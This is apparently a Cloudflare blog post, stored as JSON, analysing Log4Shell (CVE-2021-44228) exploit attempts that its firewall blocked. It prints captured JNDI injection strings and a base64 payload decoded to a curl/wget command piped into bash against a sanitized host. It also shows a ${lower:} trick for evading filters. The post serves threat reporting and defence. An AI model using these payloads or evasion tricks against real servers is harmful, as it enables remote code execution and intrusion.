{
	"post": {
		"id": "61b3bdab6bafa300116025c0",
		"uuid": "24ab9d94-e35a-42fb-b155-d67050e29738",
		"title": "Actual CVE-2021-44228 payloads captured in the wild",
		"slug": "actual-cve-2021-44228-payloads-captured-in-the-wild",
		"html": "<!--kg-card-begin: markdown--><p><em><small>This post is also available in <a href=\"http://blog.cloudflare.com/zh-cn/actual-cve-2021-44228-payloads-captured-in-the-wild-zh-cn/\">简体中文</a>, <a href=\"http://blog.cloudflare.com/zh-tw/actual-cve-2021-44228-payloads-captured-in-the-wild-zh-tw/\">繁體中文</a>, <a href=\"http://blog.cloudflare.com/ja-jp/actual-cve-2021-44228-payloads-captured-in-the-wild-ja-jp/\">日本語</a>, <a href=\"http://blog.cloudflare.com/ko-kr/actual-cve-2021-44228-payloads-captured-in-the-wild-ko-kr/\">한국어</a>, <a href=\"http://blog.cloudflare.com/fr-fr/actual-cve-2021-44228-payloads-captured-in-the-wild-fr-fr/\">Français</a>, <a href=\"http://blog.cloudflare.com/de-de/actual-cve-2021-44228-payloads-captured-in-the-wild-de-de/\">Deutsch</a>.</small></em></p>\n<!--kg-card-end: markdown--><p>I <a href=\"http://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/\">wrote earlier</a> about how to mitigate CVE-2021-44228 in Log4j, how the vulnerability came about and Cloudflare’s mitigations for our customers. As I write we are rolling out protection for our FREE customers as well because of the vulnerability’s severity.</p><p>As we now have many hours of data on scanning and attempted exploitation of the vulnerability we can start to look at actual payloads being used in wild and statistics. Let’s begin with requests that Cloudflare is blocking through our WAF.</p><p>We saw a slow ramp up in blocked attacks this morning (times here are UTC) with the largest peak at around 1800 (roughly 20,000 blocked exploit requests per minute). But scanning has been continuous throughout the day. We expect this to continue.</p><figure class=\"kg-card kg-image-card kg-width-wide\"><img src=\"http://blog.cloudflare.com/content/images/2021/12/image3-25.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><p>We also took a look at the number of IP addresses that the WAF was blocking. Somewhere between 200 and 400 IPs appear to be actively scanning at any given time.</p><figure class=\"kg-card kg-image-card kg-width-wide\"><img src=\"http://blog.cloudflare.com/content/images/2021/12/image1-58.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><p>So far today the largest number of scans or exploitation attempts have come from Canada and then the United States.</p><figure class=\"kg-card kg-image-card kg-width-wide\"><img src=\"http://blog.cloudflare.com/content/images/2021/12/image2-42.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><p>Lots of the blocked requests appear to be in the form of reconnaissance to see if a server is actually exploitable. The top blocked exploit string is this (throughout I have sanitized domain names and IP addresses):</p><p><code>${jndi:ldap://x.x.x.x/#Touch}</code></p><p>Which looks like a simple way to hit the server at x.x.x.x, which the actor no doubt controls, and log that an Internet property is exploitable. That doesn’t tell the actor much. The second most popular request contained this:</p><p><code>Mozilla/5.0 ${jndi:ldap://x.x.x.x:5555/ExploitD}/ua</code></p><p>This appeared in the User-Agent field of the request. Notice how at the end of the URI it says <code>/ua</code>. No doubt a clue to the actor that the exploit worked in the User-Agent.</p><p>Another interesting payload shows that the actor was detailing the format that worked (in this case a non-encrypted request to port 443 and they were trying to use http://):</p><p><code>${jndi:http://x.x.x.x/callback/https-port-443-and-http-callback-scheme}</code></p><p>Someone tried to pretend to be the Googlebot and included some extra information.</p><p><code>Googlebot/2.1 (+http://www.google.com/bot.html)${jndi:ldap://x.x.x.x:80/Log4jRCE}</code></p><p>In the following case the actor was hitting a public Cloudflare IP and encoded that IP address in the exploit payload. That way they could scan many IPs and find out which were vulnerable.</p><p><code>${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}</code></p><p>A variant on that scheme was to include the name of the attacked website in the exploit payload.</p><p><code>${jndi:ldap://www.blogs.example.com.gu.c1me2000ssggnaro4eyyb.example.com/www.blogs.example.com}</code></p><p>Some actors didn’t use LDAP but went with DNS. However, LDAP is by far the most common protocol being used.</p><p><code>${jndi:dns://aeutbj.example.com/ext}</code></p><p>A very interesting scan involved using Java and standard Linux command-line tools. The payload looks like this:</p><p><code>${jndi:ldap://x.x.x.x:12344/Basic/Command/Base64/KGN1cmwgLXMgeC54LngueDo1ODc0L3kueS55Lnk6NDQzfHx3Z2V0IC1xIC1PLSB4LngueC54OjU4NzQveS55LnkueTo0NDMpfGJhc2g=}</code></p><p>The base64 encoded portion decodes to a curl and wget piped into bash.</p><p><code>(curl -s x.x.x.x:5874/y.y.y.y:443||wget -q -O- x.x.x.x:5874/y.y.y.y:443)|bash</code></p><p>Note that the output from the curl/wget is not required and so this is just hitting a server to indicate to the actor that the exploit worked.</p><p>Lastly, we are seeing active attempts to evade simplistic blocking of strings like <code>${jndi:ldap</code> by using other features of Log4j. For example, a common evasion technique appears to be to use the <code>${lower}</code> feature (which lowercases characters) as follows:</p><p><code>${jndi:${lower:l}${lower:d}a${lower:p}://example.com/x</code></p><p>At this time there appears to be a lot of reconnaissance going on. Actors, good and bad, are scanning for vulnerable servers across the world. Eventually, some of that reconnaissance will turn into actual penetration of servers and companies. And, because logging is so deeply embedded in front end and back end systems, some of that won't become obvious for hours or days. </p><p>Like spores quietly growing underground some will break through the soil and into the light.</p><figure class=\"kg-card kg-image-card\"><img src=\"http://blog.cloudflare.com/content/images/2021/12/Spores.png\" class=\"kg-image\" alt loading=\"lazy\"></figure><p>Cloudflare’s security teams are working continuously as the exploit attempts evolve and will update WAF and firewall rules as needed.</p>",
		"comment_id": "61b3bdab6bafa300116025c0",
		"feature_image": "http://blog.cloudflare.com/content/images/2021/12/Actual-CVE-2021-44228-payloads-captured-in-the-wild-OG.png",
		"featured": false,
		"visibility": "public",
		"created_at": "2021-12-10T20:50:51.000+00:00",
		"updated_at": "2022-07-12T19:40:28.000+01:00",
		"published_at": "2021-12-10T21:06:56.000+00:00",
		"custom_excerpt": "I wrote earlier about how to mitigate CVE-2021-44228 in Log4j, how the vulnerability came about and Cloudflare’s mitigations for our customers. As I write we are rolling out protection for our FREE customers as well because of the vulnerability’s severity.",
		"codeinjection_head": null,
		"codeinjection_foot": null,
		"custom_template": null,
		"canonical_url": null,
		"authors": [
			{
				"id": "5d1644b141acde0011a94f2c",
				"name": "John Graham-Cumming",
				"slug": "john-graham-cumming",
				"profile_image": "http://blog.cloudflare.com/content/images/2017/03/url-2.jpg",
				"cover_image": "http://blog.cloudflare.com/content/images/2023/05/Twitter-Header-@cloudflare-US.png",
				"bio": null,
				"website": null,
				"location": "Lisbon, Portugal",
				"facebook": null,
				"twitter": null,
				"meta_title": null,
				"meta_description": null,
				"url": "http://blog.cloudflare.com/author/john-graham-cumming/"
			}
		],
		"tags": [
			{
				"id": "5d16450341acde0011a951aa",
				"name": "Vulnerabilities",
				"slug": "vulnerabilities",
				"description": "Vulnerabilities (EN)",
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/vulnerabilities/"
			},
			{
				"id": "5d16450341acde0011a95265",
				"name": "Security",
				"slug": "security",
				"description": null,
				"feature_image": "http://blog.cloudflare.com/content/images/2020/10/Security.png",
				"visibility": "public",
				"meta_title": "Cloudflare Blog: Security",
				"meta_description": "Collection of Cloudflare blog posts tagged 'Security'.",
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/security/"
			},
			{
				"id": "5d16450341acde0011a951c1",
				"name": "Page Rules",
				"slug": "page-rules",
				"description": null,
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/page-rules/"
			},
			{
				"id": "61b8bab009f69a00110869fd",
				"name": "Log4J",
				"slug": "log4j",
				"description": null,
				"feature_image": "http://blog.cloudflare.com/content/images/2021/12/Log4J.png",
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/log4j/"
			},
			{
				"id": "61b8bab009f69a00110869fe",
				"name": "Log4Shell",
				"slug": "log4shell",
				"description": null,
				"feature_image": "http://blog.cloudflare.com/content/images/2021/12/Log4Shell-.png",
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/log4shell/"
			}
		],
		"primary_author": {
			"id": "5d1644b141acde0011a94f2c",
			"name": "John Graham-Cumming",
			"slug": "john-graham-cumming",
			"profile_image": "http://blog.cloudflare.com/content/images/2017/03/url-2.jpg",
			"cover_image": "http://blog.cloudflare.com/content/images/2023/05/Twitter-Header-@cloudflare-US.png",
			"bio": null,
			"website": null,
			"location": "Lisbon, Portugal",
			"facebook": null,
			"twitter": null,
			"meta_title": null,
			"meta_description": null,
			"url": "http://blog.cloudflare.com/author/john-graham-cumming/"
		},
		"primary_tag": {
			"id": "5d16450341acde0011a951aa",
			"name": "Vulnerabilities",
			"slug": "vulnerabilities",
			"description": "Vulnerabilities (EN)",
			"feature_image": null,
			"visibility": "public",
			"meta_title": null,
			"meta_description": null,
			"og_image": null,
			"og_title": null,
			"og_description": null,
			"twitter_image": null,
			"twitter_title": null,
			"twitter_description": null,
			"codeinjection_head": null,
			"codeinjection_foot": null,
			"canonical_url": null,
			"accent_color": null,
			"url": "http://blog.cloudflare.com/tag/vulnerabilities/"
		},
		"url": "http://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/",
		"excerpt": "I wrote earlier about how to mitigate CVE-2021-44228 in Log4j, how the vulnerability came about and Cloudflare’s mitigations for our customers. As I write we are rolling out protection for our FREE customers as well because of the vulnerability’s severity.",
		"reading_time": 4,
		"access": true,
		"comments": false,
		"og_image": null,
		"og_title": null,
		"og_description": null,
		"twitter_image": null,
		"twitter_title": null,
		"twitter_description": null,
		"meta_title": null,
		"meta_description": "I wrote earlier about how to mitigate CVE-2021-44228 in Log4j, how the vulnerability came about and Cloudflare’s mitigations for our customers. As I write we are rolling out protection for our FREE customers as well because of the vulnerability’s severity.",
		"email_subject": null,
		"frontmatter": null,
		"feature_image_alt": null,
		"feature_image_caption": null
	},
	"locale": "en-us"
}